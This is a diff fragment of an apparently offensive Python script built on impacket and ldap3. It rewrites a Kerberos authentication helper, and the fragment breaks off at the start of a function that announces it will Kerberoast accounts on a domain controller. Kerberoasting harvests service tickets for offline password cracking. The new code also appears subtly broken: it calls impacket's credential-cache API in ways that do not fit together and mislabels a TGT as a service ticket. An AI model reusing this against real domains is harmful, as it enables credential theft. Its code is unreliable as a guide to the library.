@@ -3,23 +3,27 @@ from impacket.krb5.types import Principal
 from impacket.ntlm import compute_lmhash, compute_nthash
 from impacket.smbconnection import SMBConnection
 from ldap3 import Server, Connection, ALL_ATTRIBUTES, ALL
+from impacket.krb5 import constants
+from impacket.krb5.ccache import CCache
+from impacket.krb5.types import Principal, KerberosTime
+
 
 def kerberos_auth(username, password, domain, dc_ip):
     try:
-        # Connect to the Domain Controller via SMB
-        smb = SMBConnection(dc_ip, dc_ip)
-        smb.login(username, password, domain)
-
-        # Perform Kerberos authentication
-        _, krbtgt_ticket = smb.kerberosLogin(username, password, domain)
-        smb.logoff()
-
-        return krbtgt_ticket
+        # Initialize the client
+        ccache = CCache()
+        principal = Principal(f"{username}@{domain}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        creds = ccache.getCredential(principal, domain)
+        
+        # Get a service ticket (TGT) from the KDC
+        ccache, krbtgt = creds.toTGT(password)
+        
+        return ccache, krbtgt
 
     except Exception as e:
         print(f"Error during Kerberos authentication: {e}")
-        return None
-
+        return None, None
+        
 def kerberoast(domain, username, password, dc_ip):
     try:
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
